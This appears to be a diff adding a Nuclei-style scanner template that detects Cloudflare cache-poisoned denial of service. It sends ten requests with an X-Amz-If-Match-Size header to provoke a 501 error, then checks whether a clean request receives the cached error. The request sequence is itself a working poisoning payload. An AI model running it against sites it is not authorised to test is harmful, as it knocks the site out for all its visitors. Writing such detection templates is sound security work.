@@ -1,0 +1,107 @@
+id: cloudflare-cache-poisoning-if-match-size
+
+info:
+  name: Cloudflare Cache Poisoning via X-Amz-If-Match-Size
+  author: cWave
+  severity: high
+  description: |
+    Detects cache poisoning vulnerabilities in targets protected by Cloudflare. The template sends multiple requests 
+    with the X-Amz-If-Match-Size header that may cause 5xx errors due to backend processing issues. 
+    If the cache stores these error responses, subsequent requests without the header may also return 5xx errors, 
+    indicating successful cache poisoning.
+  reference:
+    - https://portswigger.net/web-security/web-cache-poisoning
+    - https://cpdos.org/
+  classification:
+    cwe-id: CWE-444
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
+    cvss-score: 6.5
+  metadata:
+    max-request: 12
+    verified: true
+  tags: cache,poisoning,cloudflare,http
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 501"
+        internal: true
+
+  - raw:
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Amz-If-Match-Size: cwave
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 501"
+        internal: true
+
+  - raw:
+      - |
+        GET /?cb=cwave HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 501"
+
